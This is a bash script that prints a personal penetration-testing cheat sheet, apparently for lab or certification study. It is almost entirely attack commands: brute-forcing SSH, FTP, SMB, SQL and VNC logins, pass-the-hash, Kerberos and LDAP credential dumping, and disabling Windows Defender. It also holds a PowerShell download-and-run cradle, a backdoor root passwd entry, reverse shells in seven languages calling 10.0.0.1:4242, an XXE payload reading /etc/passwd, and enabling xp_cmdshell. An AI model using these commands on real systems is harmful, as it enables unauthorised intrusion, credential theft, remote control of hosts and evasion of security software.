#!/bin/bash
#
# Sometimes I forget a command if I have not used it in a while. 
# I made this as a reference in an attempt to save the time it 
# take to search for what I need to known on the internet or my notes
# I also added some enum results to save finding nmap enum scripts

# ssh-tunnels
if [ "$1" == "ssh-tunnels" ]; then
        printf "REMOTE SSH TUNNEL: \nssh -f -N -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -R 2222:<compromised host ip>:22 -R 13306:<compromised ip>:3306 kali@<my-ip> -p <port>\n"
        printf "LOCAL SSH TUNNEL: \nssh -f -N -L <local port>:<localhost or second target ip>:<remote port> username@<target ip>\n"
        printf "DYNAMIC SSH TUNNEL: \nssh -f -N -D <local port> username@ip\n\n"

# ssh-enum
elif [ "$1" == "ssh-enum" ]; then
        printf "nmap -p <port> --script=ssh2-enum-algos.nse,ssh-auth-methods.nse,ssh-hostkey.nse,ssh-publickey-acceptance.nse,ssh-run.nse,sshv1.nse <ip>\n\n"

# ssh-conf
elif [ "$1" == "ssh-conf" ]; then
        printf "from=\"<target ip>\", command=\"echo 'This account can only be used for port forwarding'\",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAA... www-data@target\n\n"
        printf "ssh -f -N -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -R 2222:<compromised host ip>:22 -R 13306:<compromised ip>:3306 kali@<targetip> -p 22 -i /tmp/.tobor/id_rsa\n\n"

# ssh-brute
elif [ "$1" == "ssh-brute" ]; then
        printf "hydra -s <port> -l <username> -P /usr/share/wordlists/rockyou.txt <ip> -t <number of threads up to 16> -V ssh\n\n"
        printf "medusa -u <username> -P /usr/share/seclists/Passwords/probable-v2-top207.txt -h <ip> -M ssh -n <port>\n\n"

# telnet-brute
elif [ "$1" == "telnet-brute" ]; then
        printf "hydra -L usernames.txt -P passwords.txt <ip> telnet -V\n"
        printf "nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s <target>\n"
        printf "ncrack -U /root/Desktop/user.txt –P /root/Desktop/pass.txt <ip>:<port>\n"
        printf "patator telnet_login host=<ip> inputs='FILE0\\nFILE1' 0=/root/Desktop/user.txt 1=/root/Desktop/pass.txt  persistent=0 prompt_re='Username: | Password:'\n"

# telnet-enum
elif [ "$1" == "telnet-enum" ]; then
        printf "nmap -p 23 --script=telnet-ntlm-info.nse --script=telnet-encryption.nse <ip>\n"

# ftp-brute
elif [ "$1" == "ftp-brute" ]; then
        printf "ncrack -U usernames.txt -P passwords.txt ftp://<ip>\n"
        printf "patator ftp_login host=<ip> user=FILE0 password=FILE1 0=usernames.txt 1=passwords.txt\n"
        printf "medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -T 1\n"
        printf "medusa -M ftp -C userpass.txt\n"
        printf "hydra -L user.txt -P pass.txt 192.168.1.108 ftp -V -e nsr\n"

# smtp-enum
elif [ "$1" == "smtp-enum" ]; then
        printf "nmap -p 25 --scritp=smtp-commands.nse,smtp-enum-users.nse,smtp-ntlm-info.nse,smtp-open-relay.nse,smtp-strangeport.nse,smtp-vuln-cve2010-4344.nse,smtp-vuln-cve2011-1720.nse,smtp-vuln-cve2011-1764.nse <ip>\n"
        printf "smtp-user-enum -M VRFY -U /root/Desktop/user.txt -t 192.168.1.107\n"
        printf "ismtp -h <ip>:25 -e /root/Desktop/emaillist.txt\n"

# dns-enum
elif [ "$1" == "dns-enum" ]; then
        printf "dig axfr @<dns server> <domain>\n"
        printf "dnsrecon -d <domain> -t axfr\n"
        printf "dnsenum <domain>\n"
        printf "host -l <domain name> <dns server address>\n"
        printf "nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com\n"

# enum-subdomain
elif [ "$1" == "enum-subdomain" ]; then
        printf "dnsrecon -d megacorpone.com -D ~/subdomains.list.txt -t brt\n"
        printf "wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.domain.com' -u http://<target ip>/ --hh(or some distinguishing value to ignore)\n"

# tftp-enum
elif [ "$1" == "tftp-enum" ]; then
        printf "nmap -p 69 -sU --script=tftp-enum.nse <ip>\n"

# pop-enum
elif [ "$1" == "pop-enum" ]; then
        printf "nmap -p 110 --script=pop3-capabilities.nse,pop3-ntlm-info.nse <ip>\n"

# rpc-enum
elif [ "$1" == "rpc-enum" ]; then
        printf "nmap -p 111 --script=rpcinfo.nse <ip>\n"
        printf "nbtscan <ip>-<range>\n"
        printf "enum4linux -a <ip>\n"

# rpcclient
elif [ "$1" == "rpcclient" ] ; then
        printf "srvinfo\n"
        printf "enumdomusers\n"
        printf "queryuser <username>\n"
        printf "querydominfo\n"
        printf "getdompwinfo\n"

# nfs-enum
elif [ "$1" == "nfs-enum" ]; then
        printf "nmap -p 111 --script=nfs*.nse <ip>\n"

# imap-enum
elif [ "$1" == "imap-enum" ]; then
        printf "nmap -p 143 --script=imap-capabilities.nse,imap-ntlm-info.nse <ip>\n"

# smb-access
elif [ "$1" == "smb-access" ]; then
        printf "smbmap -u user -p password -d domain.com -H <ip>\n"
        printf "python /usr/share/doc/python3-impacket/examples/smbclient.py domain//username:password@target -port <destination port> [-no-pass] \n"
        printf "smbclient -U 'domain/username%passwordorhash' //<targetip>/<share> [--pw-nt-hash] [-N|--no-pass]\n"

# smb-enum
elif [ "$1" == "smb-enum" ]; then
        printf "START LISTENER: ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]'\nCONNECT TO LISTENER: smbclient -L <ip> -U "" -N\n\n"
        printf "smblcient -N -U "guest" -L <ip> \n"
        printf "SAMBA CRY CHECK: nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p <port> <ip>\n"
        printf "smbmap -R -H <ip>\n"
        printf "nmap -p 139,445 --script=smb-os-discovery.nse,smb-mbenum.nse,smb2-capabilities.nse,smb2-security-mode.nse,smb-enum-*.nse,smb-security-mode.nse,smb-protocols.nse,smb-system-info.nse,smb-print-text.nse,smb-vuln-*.nse,smb-ls.nse  <ip>\n"

# smb-brute
elif [ "$1" == "smb-brute" ]; then
        printf "hydra -L usernames.txt -P passwords.txt 192.168.2.66 smb -V -f\n"
        printf "ncrack –U /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 –p 445\n"
        printf "medusa -h 192.168.1.118 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M smbnt\n"

# sql-brute
elif [ "$1" == "sql-brute" ]; then
        printf "hydra -L usernames.txt -P passwords.txt 192.168.2.66 mysql -V -f\n"
        printf "hydra -L usernames.txt -P passwords.txt 192.168.2.62 postgres -V\n"
        printf "nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt <host>\n"
        printf "nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>\n"

# rdp-enum
elif [ "$1" == "rdp-enum" ]; then
        printf "nmap -p 3389 --script=rdp-enum-encryption.nse,rdp-ntlm-info.nse,rdp-vuln-ms12-020.nse <ip>\n"

# ldap-enum
elif [ "$1" == "ldap-enum" ]; then
        printf "bloodhound-python -d domain.com -u user -p 'Password1' -gc hostname.domain.local -c all -ns <ip>\n"
        printf "ldapsearch -h <ip> -x -b DC=domain,DC=local > ldapsearch.txt\n"
        printf "nmap --script=ldap-search.nse <ip> -p389 -oN ldapsearch.results\n"
        printf "nmap --script=ldap-rootdse.nse <ip> -p389 -oN ldaprootdes.results\n"
        printf "python samrdump.py <ip>\n"
        printf "python secretsdump.py <ip>\n"
        printf "ldapdomaindump -u domain\\user -p 'Password1' -n <ip> <ip>\n"
        printf "python GetNPUsers.py domain.com/ -usersfile /path/to/user.list -format [john|hashcat] -outputfile hashes.txt -request -dc-ip <dc-ip>\n"

# vnc-enum
elif [ "$1" == "vnc-enum" ]; then
        printf "nmap -p 5800,5900 --sciprt=vnc-info.nse --script=vnc-title.nse <ip>\n"

# vnc-brute
elif [ "$1" == "vnc-brute" ]; then
        printf "hydra -P passwords.txt <ip> vnc -V\n"
        printf "medusa -h <ip> –u root -P /root/Desktop/pass.txt –M vnc\n"
        printf "ncrack -V --user root -P /path/to/pass.txt <ip>:5900\n"
        printf "patator vnc_login host=<ip> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0\n"

# wp-brute
elif [ "$1" == "wp-brute" ]; then
        printf "wpscan --url http://<ip>/<wp-parent> --usernames wpuser.lst --passwords /usr/share/wordlists/rockyou.txt\n"

# wp-enum
elif [ "$1" == "wp-enum" ]; then
        printf "wpscan --url http://<ip>/<wp-parent> --enumerate ap,at,cb,dbe --api-token <api token> -o wpscan.results\n"

# pth
elif [ "$1" == "pth" ]; then
        printf "smbclient -U domain/user%hash:hash -n <netbios name> -W <domain> //<ip>/share$\n"
        printf "python /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<ntlm hash> Administrator@<target>\n"
        printf "pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:<ntlm hash> //<ip> cmd\n"
        printf "pth-smbclient //<target ip>/c$ -U <domain>/<username>%aad3b435b51404eeaad3b435b51404ee:<ntlm hash>\n"
        printf "crackmapexec <ip> -u user -H <hash>\n"
        printf "xfreerdp /u:admin /d:domain /pth:hash:hash /v:<ip>\n"

# windows-firewall
elif [ "$1" == "windows-firewall" ]; then
        printf "Set-MpPreference -DisableRealtimeMonitoring $true\n"
        printf "Set-MpPreference -ExclusionPath 'C:\Windows\System32\spool\drivers\color'\n"

# suid
elif [ "$1" == "suid" ]; then
        printf "find / -perm -u=s -type f 2>/dev/nul\n"

# IEX
elif [ "$1" == "IEX" ]; then
        printf "IEX (New-Object Net.WebClient).downloadString('http://ip/file.txt')\n"

# passwd
elif [ "$1" == "passwd" ]; then
        printf "openssl passwd Passw0rd1\n"
        printf "echo 'tobor:r6/TCn03QnsGE:0:0:root:/root:/bin/bash' >> malicious_passwd_file\n"

# rev-shell
elif [ "$1" == "rev-shell" ]; then
        printf "nc <ip> <port> -e /bin/bash"
        printf "OpenBSD Netcat: mkfifo /tmp/tobor; nc <ip> <port> 0</tmp/tobor | /bin/sh>/tmp/tobor 2>&1; rm /tmp/tobor\n"
        printf "BASH: bash -i >& /dev/tcp/10.0.0.1/4242 0>&1\n"
        printf "SH: sh -i >& /dev/udp/10.0.0.1/4242 0>&1\n"
        printf "SOCAT:\n\tATTACK: socat file:\`tty\`,raw,echo=0 TCP-L:4242\n\tTARGET: /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242\n"
        printf "PERL: perl -e 'use Socket;$i=\"10.0.0.1\";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -ii\");};'\n"
        printf "PYTHON: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'\n"
        printf "PHP: php -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n"
        printf "RUBY: ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4242).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n"
        printf "GO: echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"10.0.0.1:4242\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n"
        printf "AWK: awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4242\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $\\0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null\n"

# xxe
elif [ "$1" == "xxe" ]; then
        printf "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n
<stockCheck><productId>&xxe;</productId></stockCheck>\n"

# xp_cmdshell
elif [ "$1" == "xp_cmdshell" ]; then
        printf "ENABLE XP_CMDSHELL: sp_configure 'show advanced options', '1'\nreconfigure\nsp_configure 'xp_cmdshell', '1' \nreconfigure\n"
        printf "CREATE USER FOR XP_CMDHSELL: use <database>;\ngo;\ncreate user test for loging test;\ngo\ngrant exec on xp_cmdshell to test;\ngo\n"
fi
